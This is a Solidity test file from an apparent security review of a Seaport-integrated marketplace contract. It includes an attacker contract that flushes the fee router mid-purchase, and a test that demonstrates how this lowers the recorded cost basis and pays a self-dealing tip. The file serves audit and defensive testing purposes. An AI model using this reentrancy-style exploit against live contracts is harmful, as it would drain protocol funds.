// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {FixedPointMathLib} from "solady/utils/FixedPointMathLib.sol";
import {ICore} from "../src/interfaces/ICore.sol";
import {IFeeRouter} from "../src/interfaces/IFeeRouter.sol";
import {Lane, Mainnet, Settings} from "../src/interfaces/Interfaces.sol";
import {SeaportBase} from "./Seaport.t.sol";
import {FeeBase} from "./Fees.t.sol";
import {OrderComponents} from "./utils/SeaportTypes.sol";

/// independent review of the v2 port (docs/REVIEW-v2port.md). `test_FINDING_*` asserts a real defect as it behaves
/// today and passes today. `test_OK_*` confirms a property that holds. real contracts on the pinned fork, attacker
/// contracts only where a third party needs code

/// a seller side contract that flushes the fee router when Seaport pays it, i.e. inside the Core's measured call
contract FlushingPayee {
    IFeeRouter public immutable ROUTER;
    bool public armed;
    uint256 public flushedTips;

    constructor(address router_) {
        ROUTER = IFeeRouter(payable(router_));
    }

    function arm() external {
        armed = true;
    }

    receive() external payable {
        if (armed) {
            armed = false;
            uint256 b = address(this).balance;
            ROUTER.flush();
            flushedTips = address(this).balance - b;
        }
    }
}

/// F1. a stranger flushes the fee router in the middle of `buyListing`. the router balance is the engine's own queued fee
/// eth, so the attacker pays nothing for it, unlike a swap or an escrow claim (the cases the existing tests cover)
contract ReviewSeaportFlushTest is SeaportBase {
    using FixedPointMathLib for uint256;

    uint256 internal constant TARGET_RATE = 1e15;

    function setUp() public override {
        super.setUp();
        Settings memory cs = core.settings();
        cs.rateCap = uint64(TARGET_RATE);
        _setSettings(cs);
        _fundPot(30 ether);
        for (uint256 i; i < 900 && core.ethRate() < TARGET_RATE; ++i) {
            _warp(1 hours);
        }
        assertGe(core.ethRate(), TARGET_RATE);
    }

    /// leaves `eth` of buy volume worth of fees in the router (the hook pushed them, nobody flushed yet)
    function _queueFees(uint256 buyEth) internal returns (uint256 held) {
        autoFlush = false;
        _buyCoin(funder, buyEth);
        autoFlush = true;
        held = address(feeRouter).balance;
    }

    /// the maker lists at exactly the ceiling (no savings, so no tip is due) with a one wei second recipient that is
    /// the attacker contract. returns the data for the door
    function _order(uint256 id, uint256 price, FlushingPayee atk) internal returns (bytes memory) {
        OrderComponents memory c = _open(id, price - 1, 1);
        c.consideration[1].recipient = payable(address(atk));
        return _basicData(c);
    }

    function test_FINDING_strangerFlushInsideBuyListingLowersCostBasisAndPaysASelfDealTip() public {
        uint256 held = _queueFees(1.5 ether);
        uint256 id = _list();
        uint256 price = core.ceilingOf(id);
        assertGt(held, 0.05 ether);
        assertLt(held, price / 3, "the queued fees stay under the price");
        FlushingPayee atk = new FlushingPayee(address(feeRouter));
        atk.arm();
        bytes memory data = _order(id, price, atk);

        uint256 pot0 = core.ethPot();
        uint256 bal0 = address(core).balance;
        uint256 maker0 = maker.balance;
        vm.prank(maker);
        core.buyListing(price, data, id, Mainnet.SEAPORT);

        (,, uint256 booked,) = core.creditInfo(id);
        uint256 tip = maker.balance - maker0 - (price - 1);
        // eth the flush put into the Core during the call: balance after = before - price + flushed - tip
        uint256 flushed = address(core).balance + price + tip - bal0;
        emit log_named_uint("price", price);
        emit log_named_uint("queued fees flushed mid call", flushed);
        emit log_named_uint("buyListing tip", tip);
        emit log_named_uint("recorded cost basis", booked - tip);
        // the order was at the ceiling: with an honest measurement there is no savings and no tip
        assertGt(tip, 0, "FINDING: a tip is paid on a purchase at the ceiling");
        assertLt(booked - tip, price - 1, "FINDING: the cost basis is below the price the seller was paid");
        assertEq(core.ethPot(), pot0 - booked, "the pot paid the understated cost plus the tip");
        assertGt(flushed, held * 99 / 100, "what the flush delivered is what lowered the cost");
        assertEq(booked - tip, price - flushed, "cost basis = price - the flushed fees (the fees paid for the credit)");
        assertEq(address(core).balance, core.ethPot() + core.ethToBuyback(), "pots stay consistent: only the tip left");
        // the sell door pays exactly the ceiling for the same credit, so the maker side now beats the door
        assertGt(maker.balance - maker0 + 1, price, "FINDING: self dealing through the door beats the sell door");
    }

    function test_OK_theSameOrderWithAnEmptyRouterPaysNoTip() public {
        uint256 id = _list();
        uint256 price = core.ceilingOf(id);
        FlushingPayee atk = new FlushingPayee(address(feeRouter));
        atk.arm();
        bytes memory data = _order(id, price, atk);
        assertEq(address(feeRouter).balance, 0);
        uint256 maker0 = maker.balance;
        vm.prank(maker);
        core.buyListing(price, data, id, Mainnet.SEAPORT);
        (,, uint256 booked,) = core.creditInfo(id);
        assertEq(maker.balance - maker0, price - 1, "no tip at the ceiling");
        assertEq(booked, price, "the cost basis is the price");
    }
}
